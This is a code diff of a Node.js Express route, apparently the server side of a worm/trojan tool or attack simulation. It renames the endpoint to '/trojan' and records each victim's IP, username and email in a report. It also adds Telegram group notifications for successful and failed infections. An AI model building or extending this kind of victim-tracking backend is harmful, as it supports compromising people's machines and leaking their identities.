@@ -18,7 +18,7 @@ const caminho = path.join(__dirname, '..', '..', 'database')
 
 module.exports = app => {
  
-    app.get('/worm', async (req, res) => {
+    app.get('/trojan', async (req, res) => {
 
         res.statusCode = 200;
         res.setHeader('Content-Type', 'text/json');
@@ -36,11 +36,17 @@ module.exports = app => {
             saida.relatorio.maquinas.push(ip_vitima)
             saida.relatorio.notificacao_email.adm = usuario_vitima
             saida.relatorio.notificacao_email.email = email_vitima
+            const informacoesTelegram = notas.textoTelegram('trojan')(email_vitima)('sucesso')(ip_vitima)
+            telegram.msgGp(informacoesTelegram)
+            saida.relatorio.notificacao_telegram.bot = env.nome_bot
         }catch(e){
             saida.relatorio.situacao = "falha"
+            const informacoesTelegram = notas.textoTelegram('trojan')('email não enviado')('falha')(ip_vitima)
+            telegram.msgGp(informacoesTelegram)
             res.end(`${JSON.stringify(saida)}`)
             console.error(e)
         }
+        console.log(saida)
         res.end(`${JSON.stringify(saida)}`)  
     });
 }
